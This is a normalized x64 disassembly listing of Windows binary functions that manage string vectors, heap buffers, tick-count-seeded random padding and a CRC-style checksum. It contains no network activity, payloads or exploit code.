mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xc0 ]
add rsp 0x80
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_18001c80c
mov rdi [ rsp + 0x50 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub_180009910
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
push r12
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x60 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
add rsp 0x38
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x68 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rdx rdi
mov rcx rbx
call sub_180003f60
nop
cmp rdi rsi
je r-xdata
sub_180009990
push rbx
sub rsp 0x30
movzx eax [ rsp + 0x40 ]
mov r10 r9
mov r11 r8
mov rbx rdx
lea r9 [ rcx + 0x18 ]
mov [ rsp + 0x28 ] al
mov r8 r10
mov rdx r11
mov rcx rbx
mov [ rsp + 0x20 ] 0x0
call sub_180009910
add rsp 0x30
pop rbx
retn
sub_1800099d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r12 [ rw-data ]
mov rbx rdx
lea rdi [ rcx + 0x8 ]
mov [ rdx ] r12
mov r8 [ rdi + 0x8 ]
mov r14 0x6666666666666667
sub r8 [ rdi ]
mov rax r14
xor r9b r9b
xor r13d r13d
mov rsi rcx
imul r8
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rcx [ rbx ]
mov edx 0x1
call sub_18001d210
mov rbp rax
test rax rax
jne r-xdata
mov r8d r13d
nop [ rax + rax ] ax
movzx ecx [ rsi ]
mov rax [ rw-data ]
lea rbx [ r12 + rbp ]
mov [ rax + rbp ] cx
movzx ecx [ rsi + 0x2 ]
mov rax [ rw-data ]
mov [ rax + rbp ] cl
mov rax [ rw-data ]
movzx ecx [ rsi + 0x3 ]
mov [ rax + rbp ] cl
mov rcx [ rdi + 0x8 ]
mov rax r14
sub rcx [ rdi ]
xor r12b r12b
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov rcx rdi
mov [ rbx ] r13
call sub_180002680
xor eax eax
jmp r-xdata
inc [ rbx ]
mov rax [ rdi ]
mov rdx [ rbx ]
lea rcx [ r8 + r8 * 4 ]
inc r9b
mov rcx [ rax + rcx * 8 + 0x10 ]
movzx r8d r9b
lea rax [ rdx + rcx * 2 + 0x3 ]
mov [ rbx ] rax
mov rcx [ rdi + 0x8 ]
mov rax r14
sub rcx [ rdi ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
movzx r9d [ rw-data ]
mov r8 r13
nop [ rax + rax ] ax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ rdi ] r13
mov [ rdi + 0x8 ] r13
mov [ rdi + 0x10 ] r13
mov rax rbp
mov rsi [ rdi + 0x8 ]
cmp rbx rsi
je r-xdata
mov rdx [ rax + rsi * 8 + 0x10 ]
lea rcx [ rbx + 0x1 ]
add r9 r9
add rdx rdx
call sub_18001d25c
mov r11 [ rdi ]
movzx r9d [ rw-data ]
mov rax [ r11 + rsi * 8 + 0x10 ]
mov [ rbx + rax * 2 + 0x3 ] r9b
mov rcx [ rdi + 0x8 ]
sub rcx [ rdi ]
lea rbx [ rbx + rax * 2 + 0x3 ]
inc r12b
mov rax r14
movzx r8d r12b
inc rbx
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jb r-xdata
mov r8 [ r8 ]
mov rcx [ rdi ]
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx ] r9b
mov rax [ rdi ]
lea rsi [ r8 + r8 * 4 ]
cmp [ rax + rsi * 8 + 0x18 ] 0x8
mov r9 [ rax + rsi * 8 + 0x10 ]
lea r8 [ rax + rsi * 8 ]
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180009c00
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rsi
mov rdi rdx
mov rbx rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rbx ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_1800031a0
mov rsi rax
mov [ rsp + 0x68 ] rax
movzx eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rsi
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_180009910
nop
mov r8 [ rbx + 0x8 ]
mov r9 [ rbx ]
mov rcx r8
sub rcx r9
mov rax r13
imul rcx
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test r9 r9
je r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x10 ] rcx
lea rax [ r12 + r12 * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x8 ] rcx
mov [ rbx ] rsi
mov rdx r9
mov rcx rbx
call sub_180002620
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180009d20
push rdi
sub rsp 0x20
mov r8 [ rcx + 0x8 ]
mov r11 rdx
mov rdi 0x6666666666666667
sub r8 [ rcx ]
mov rax rdi
mov r9 0x666666666666666
mov r10 rcx
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax r9
sub rax r11
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rdi
add r8 r11
sub rcx [ r10 ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
add rsp 0x20
pop rdi
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
xor edx edx
jmp r-xdata
cmp rdx r8
mov rcx r10
cmovb rdx r8
call sub_180009c00
sub_180009dd0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180009d20
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_180001ac0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180009d20
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180001ac0
nop
sub_180009ed0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xa0
mov [ rbp - 0x19 ] 0xfffffffffffffffe
mov [ rsp + 0xf0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov r15 r8
mov rdi rdx
mov r13 rcx
mov [ rbp - 0x29 ] rcx
xor r9d r9d
mov [ rbp - 0x31 ] r9d
mov [ rbp - 0x59 ] r9d
mov r12d r9d
mov [ rbp - 0x51 ] r9
mov ebx r9d
mov [ rbp - 0x49 ] rbx
mov r14d r9d
mov [ rbp - 0x41 ] r9
mov r8 [ rw-data ]
cmp r15 r8
jae r-xdata
mov rax [ rw-data ]
movzx ecx [ rax + rdx ]
mov [ rbp - 0x59 ] cx
mov rax [ rw-data ]
movzx edx [ rax + rdx ]
mov [ rbp - 0x57 ] dl
mov rax [ rw-data ]
movzx eax [ rax + rdi ]
mov [ rbp - 0x56 ] al
add rdi r8
sub r15 r8
mov rsi r9
je r-xdata
mov [ rcx ] r9d
add rcx 0x8
lea rdx [ rbp - 0x51 ]
call sub_180002700
nop
jmp r-xdata
mov [ r13 ] cx
mov [ r13 + 0x2 ] dl
mov [ r13 + 0x3 ] al
lea rcx [ r13 + 0x8 ]
lea rdx [ rbp - 0x51 ]
call sub_180002700
nop
mov r13 rdi
nop [ rax + rax ] ax
lea rcx [ rbp - 0x51 ]
call sub_180002680
mov rax r13
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xf0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea rdx [ rsi + r13 + 0x1 ]
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] r9
mov [ rbp - 0x11 ] r9w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x11 ]
call sub_180003b50
nop
lea rax [ rbp - 0x11 ]
cmp rax rbx
jae r-xdata
inc rsi
jmp r-xdata
cmp rbx r14
jne r-xdata
lea rax [ rbp - 0x11 ]
cmp r12 rax
ja r-xdata
cmp rsi r15
jb r-xdata
mov [ rbp - 0x21 ] rbx
mov [ rbp - 0x31 ] rbx
test rbx rbx
je r-xdata
mov edx 0x1
lea rcx [ rbp - 0x51 ]
call sub_180009d20
mov r14 [ rbp - 0x41 ]
mov rbx [ rbp - 0x49 ]
mov r12 [ rbp - 0x51 ]
lea rcx [ rbp - 0x11 ]
sub rcx r12
mov rax 0x6666666666666667
imul rcx
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rbx r14
jne r-xdata
movsx ecx [ rw-data ]
movzx eax [ rsi + r13 ]
cmp eax ecx
je r-xdata
movzx eax [ rbp - 0x56 ]
movzx edx [ rbp - 0x57 ]
movzx ecx [ rbp - 0x59 ]
mov r13 [ rbp - 0x29 ]
add rbx 0x28
mov [ rbp - 0x49 ] rbx
mov rax [ rbp - 0x1 ]
lea rsi [ rsi + rax * 2 + 0x4 ]
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
xor eax eax
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x11 ]
mov rcx rbx
call sub_180001ac0
nop
lea rax [ rdi + rdi * 4 ]
lea rdx [ r12 + rax * 8 ]
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x21 ] rbx
test rbx rbx
je r-xdata
mov edx 0x1
lea rcx [ rbp - 0x51 ]
call sub_180009d20
mov r14 [ rbp - 0x41 ]
mov rbx [ rbp - 0x49 ]
mov r12 [ rbp - 0x51 ]
xor r9d r9d
mov rcx [ rbp - 0x11 ]
call j_sub_18001c80c
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
xor eax eax
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rcx rbx
call sub_180001ac0
nop
sub_18000a160
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor eax eax
mov rsi rdx
mov rdi rcx
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x28 ] al
test rdx rdx
je r-xdata
xor al al
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test r8d r8d
je r-xdata
mov eax [ rw-data ]
cmp r8d eax
jb r-xdata
mov [ rsp + 0x30 ] rbx
mov [ rcx + 0x28 ] al
mov ebx eax
call [ GetProcessHeap@IAT ]
mov r8d ebx
mov edx 0x8
mov rcx rax
call [ HeapAlloc@IAT ]
mov r8d [ rw-data ]
mov rdx rsi
mov rcx rax
mov [ rdi + 0x8 ] rax
call sub_18001c4a0
mov r11 [ rdi + 0x8 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] r11
mov al 0x1
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000a200
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x8 ]
mov rbx rcx
test rdi rdi
je r-xdata
mov rdi [ rbx + 0x18 ]
test rdi rdi
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
mov rdi [ rbx + 0x10 ]
test rdi rdi
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
xor eax eax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x28 ] al
mov rbx [ rsp + 0x30 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
sub_18000a2a0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov esi edx
mov edi ecx
mov [ rsp + 0x30 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x30 ]
call sub_18001d2ec
cmp esi edi
jbe r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax edi
add rsp 0x20
pop rdi
retn
mov eax [ rsp + 0x30 ]
xor edx edx
sub esi edi
div esi
lea eax [ rdi + rdx ]
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000a310
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov ecx edx
movzx edi r9b
movzx esi r8b
mov ebx edx
mov ebp edx
call sub_18000a610
mov r12 rax
test ebx ebx
je r-xdata
add rsp 0x20
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x60 ] r14
movzx r13d dil
mov rdi rax
xor r14d r14d
movzx esi sil
nop [ rax ] eax
mov edx esi
mov eax [ rsp + 0x58 ]
xor edx edx
mov ecx r13d
sub ecx esi
div ecx
add edx esi
jmp r-xdata
mov [ rsp + 0x58 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x58 ]
call sub_18001d2ec
cmp r13d esi
jbe r-xdata
mov r14 [ rsp + 0x60 ]
mov r13 [ rsp + 0x50 ]
mov rax r12
mov [ rdi ] dl
inc rdi
dec rbp
jne r-xdata
sub_18000a3b0
xor r9d r9d
mov r10 rdx
test r8d r8d
je r-xdata
movzx eax r9w
retn
mov r11d r8d
nop
shr r8b 0x1
dec rdx
jne r-xdata
xor r9w cx
movzx eax r8b
xor al r9b
shr r9w 0x1
test al 0x1
je r-xdata
inc r10
dec r11
jne r-xdata
movzx r8d [ r10 ]
mov edx 0x8
nop [ rax ] eax
sub_18000a400
mov [ rsp + 0x8 ] rbx
movzx r11d [ rdx ]
movzx ebx [ rdx + 0x2 ]
xor ecx ecx
add r8d 0xfffffffc
je r-xdata
cmp bx cx
mov rbx [ rsp + 0x8 ]
sete al
retn
lea r9 [ rdx + 0x4 ]
mov r10d r8d
nop [ rax ] eax
shr dl 0x1
dec r8
jne r-xdata
xor cx r11w
movzx eax dl
xor al cl
shr cx 0x1
test al 0x1
je r-xdata
inc r9
dec r10
jne r-xdata
movzx edx [ r9 ]
mov r8d 0x8
nop [ rax + rax ] ax
sub_18000a4c0
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov eax [ rw-data ]
mov rsi rdx
mov rdi rcx
cmp r8d eax
je r-xdata
mov [ rsp + 0x30 ] rbx
mov rbx [ rcx + 0x10 ]
test rbx rbx
je r-xdata
xor al al
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov ebx eax
call [ GetProcessHeap@IAT ]
mov r8d ebx
mov rcx rax
mov edx 0x8
call [ HeapAlloc@IAT ]
mov r8d [ rw-data ]
mov rdx rsi
mov rcx rax
mov [ rdi + 0x10 ] rax
call sub_18001c4a0
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x10 ] 0x0
xor al al
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000a5a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x10 ]
mov rbx rcx
test rdi rdi
je r-xdata
mov rdi [ rbx + 0x18 ]
test rdi rdi
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
xor r11d r11d
mov [ rbx + 0x18 ] r11
mov [ rbx + 0x10 ] r11
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call [ GetProcessHeap@IAT ]
mov r8 rdi
mov edx 0x8
mov rcx rax
call [ HeapFree@IAT ]
sub_18000a640
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov edx 0x8
mov rcx rax
add rsp 0x20
pop rbx
jmp [ HeapFree@IAT ]
sub_18000a680
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov edx 0x8
mov rcx rax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ HeapAlloc@IAT ]
test rdx rdx
jne r-xdata
call [ GetProcessHeap@IAT ]
mov r9 rbx
mov r8 rdi
mov rcx rax
mov edx 0x8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ HeapReAlloc@IAT ]
call [ GetProcessHeap@IAT ]
lea edx [ rbx + 0x8 ]
mov r8 rdi
mov rcx rax
call [ HeapFree@IAT ]
xor eax eax
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000a750
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov ecx [ r8 ]
mov rdi r8
mov rsi rdx
call sub_18000a610
mov r8d [ rdi ]
mov rdx rsi
mov rcx rax
mov rbx rax
call sub_18001c4a0
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000a7c0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x30 ]
test rcx rcx
je r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
add rsp 0x30
pop rbx
retn
call sub_18000a640
nop
sub_18000a810
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x30
mov rbx r8
mov rbp rdx
mov rsi rcx
test rdx rdx
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
xor eax eax
add rsp 0x30
pop rsi
retn
test rbx rbx
je r-xdata
mov eax [ r8 ]
test eax eax
je r-xdata
cmp [ rcx + 0x30 ] 0x0
je r-xdata
cmp [ rcx + 0x38 ] 0x0
je r-xdata
lea ecx [ rax + 0x1 ]
mov [ rsp + 0x40 ] rdi
call sub_18000a610
mov r8d [ rbx ]
mov rdx rbp
mov rcx rax
mov rdi rax
call sub_18001c4a0
mov r11d [ rbx ]
mov r8 rbx
mov [ r11 + rdi ] 0xff
inc [ rbx ]
mov ecx [ rsi + 0x38 ]
mov r10 [ rsi ]
mov r9 [ rsi + 0x30 ]
mov [ rsp + 0x20 ] ecx
mov rcx rsi
mov rdx rdi
call [ r10 + 0x20 ]
mov rcx rdi
mov rbx rax
call sub_18000a640
mov rdi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x30
pop rsi
retn
sub_18000a8c0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov rbp rdx
lea rdx [ rsp + 0x50 ]
mov rdi r9
mov esi r8d
mov rbx rcx
mov [ rsp + 0x50 ] 0x0
call sub_18000a290
mov r10d [ rsp + 0x50 ]
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x40 ] r10d
mov r10 [ rbx ]
mov rdx rax
mov rcx rbx
mov r12 rax
call [ r10 + 0x30 ]
test al al
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rbx
mov [ rdi ] esi
call sub_18000a810
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov rcx [ rbx + 0x30 ]
test rcx rcx
je r-xdata
mov eax [ rsp + 0x40 ]
lea r8 [ rbx + 0x38 ]
mov rdx r12
mov [ r8 ] eax
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov [ rbx + 0x30 ] rax
call sub_18000a640
sub_18000a960
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
mov r12 rdx
lea rdx [ rsp + 0x60 ]
mov rbx r9
mov ebp r8d
mov rdi rcx
mov [ rsp + 0x60 ] 0x0
call sub_18000a290
mov r10d [ rsp + 0x60 ]
lea r8 [ rsp + 0x50 ]
mov [ rsp + 0x50 ] r10d
mov r10 [ rdi ]
mov rdx rax
mov rcx rdi
mov rsi rax
call [ r10 + 0x30 ]
test al al
je r-xdata
mov [ rbx ] ebp
mov eax [ rdi + 0x38 ]
mov r10 [ rdi ]
mov r9 [ rdi + 0x30 ]
mov r8 rbx
mov rdx r12
mov rcx rdi
mov [ rsp + 0x20 ] eax
call [ r10 + 0x28 ]
cmp [ rbx ] 0x0
mov r11 rax
je r-xdata
mov rcx [ rdi + 0x30 ]
test rcx rcx
je r-xdata
mov rcx r11
call sub_18000a640
xor eax eax
mov edx [ rbx ]
dec edx
cmp [ rdx + rax ] 0x0
jne r-xdata
mov eax [ rsp + 0x50 ]
lea r8 [ rdi + 0x38 ]
mov rdx rsi
mov [ r8 ] eax
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x18 ]
mov [ rdi + 0x30 ] rax
call sub_18000a640
mov eax [ rbx ]
test eax eax
je r-xdata
mov [ rbx ] edx
test edx edx
jne r-xdata
dec eax
mov rcx r11
mov edx eax
mov [ rbx ] eax
call sub_18000a680
jmp r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
sub_18000aa70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
movzx eax [ rcx + 0x40 ]
mov r10 rdx
mov rdi rcx
add [ r8 ] eax
mov edx [ r8 ]
mov rcx r10
inc edx
mov rbp r9
mov rsi r8
call sub_18000a680
movzx r8d [ rdi + 0x40 ]
mov ecx [ rsi ]
sub rcx r8
mov rdx rbp
mov rbx rax
add rcx rax
call sub_18001c4a0
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000aae0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
movzx ecx [ rcx + 0x40 ]
mov rbp r8
mov rbx rdx
call sub_18000a610
movzx r8d [ rsi + 0x40 ]
mov edx [ rbp ]
mov rcx rax
mov rdi rax
sub rdx r8
add rdx rbx
call sub_18001c4a0
movzx r11d [ rsi + 0x40 ]
mov rbx [ rsp + 0x30 ]
sub [ rbp ] r11d
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18000ab40
push rbp
push rsi
push rdi
push r12
push r15
sub rsp 0x30
mov rbp r9
mov rdi r8
mov r15 rdx
mov rsi rcx
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x30
pop r15
pop r12
pop rdi
pop rsi
pop rbp
retn
test r8 r8
je r-xdata
cmp [ r8 ] 0x0
je r-xdata
test r9 r9
je r-xdata
mov r12d [ rsp + 0x80 ]
test r12d r12d
je r-xdata
movzx eax [ rcx + 0x40 ]
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] r13
xor r13d r13d
mov [ rsp + 0x70 ] r14
mov r14 r9
test al al
je r-xdata
mov ecx [ rdi ]
inc ecx
call sub_18000a610
mov r8d [ rdi ]
mov rdx r15
mov rcx rax
mov rbx rax
call sub_18001c4a0
mov r11 [ rsi ]
mov r9 r14
mov r8 rdi
mov rdx rbx
mov rcx rsi
mov [ rsp + 0x20 ] r12d
call [ r11 + 0x38 ]
cmp [ rsi + 0x40 ] 0x0
mov rbx rax
je r-xdata
movzx edx al
mov r9b 0xff
xor r8d r8d
call sub_18000a310
movzx ecx [ rsi + 0x40 ]
add ecx r12d
mov r13 rax
call sub_18000a610
mov r8d r12d
mov rdx rbp
mov rcx rax
mov r14 rax
call sub_18001c4a0
movzx r8d [ rsi + 0x40 ]
lea rcx [ r12 + r14 ]
mov rdx r13
call sub_18001c4a0
movzx r11d [ rsi + 0x40 ]
add r12d r11d
mov r14 [ rsp + 0x70 ]
mov r13 [ rsp + 0x68 ]
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop r15
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r9 r13
mov r8 rdi
mov rdx rax
mov rcx rsi
call sub_18000aa70
mov rcx r13
mov rbx rax
call sub_18000a640
mov rcx r14
call sub_18000a640
sub_18000ac80
push rbp
push rsi
push r12
push r13
push r15
sub rsp 0x30
mov rbp r9
mov rsi r8
mov r15 rdx
mov r12 rcx
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x30
pop r15
pop r13
pop r12
pop rsi
pop rbp
retn
test r8 r8
je r-xdata
cmp [ r8 ] 0x0
je r-xdata
test r9 r9
je r-xdata
mov r13d [ rsp + 0x80 ]
test r13d r13d
je r-xdata
cmp [ rcx + 0x40 ] 0x0
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r14
mov r14 r9
je r-xdata
mov ecx [ rsi ]
inc ecx
call sub_18000a610
mov r8d [ rsi ]
mov rdx r15
mov rcx rax
mov rbx rax
call sub_18001c4a0
mov r11 [ r12 ]
mov r9 r14
mov r8 rsi
mov rdx rbx
mov rcx r12
mov [ rsp + 0x20 ] r13d
call [ r11 + 0x40 ]
cmp [ r12 + 0x40 ] 0x0
mov rbx rax
